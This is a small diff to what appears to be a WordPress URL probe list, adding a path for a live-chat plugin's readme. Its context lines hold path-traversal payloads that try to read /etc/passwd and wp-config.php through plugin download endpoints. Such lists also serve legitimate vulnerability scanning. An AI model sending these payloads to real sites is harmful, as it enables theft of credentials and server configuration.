@@ -85,3 +85,4 @@
 /wp-content/plugins/ioncube-tester-plus/loader-wizard.php?page=phpconfig&download=1&ininame=../../../../../../../../etc/passwd
 /wp-content/plugins/video-conferencing-with-zoom-api/README.txt
 /wp-json/wooconvo/v1/download-file?order_id=1&filename=../../../../wp-config.php
+/wp-content/plugins/wp-live-chat-software-for-wordpress/readme.txt
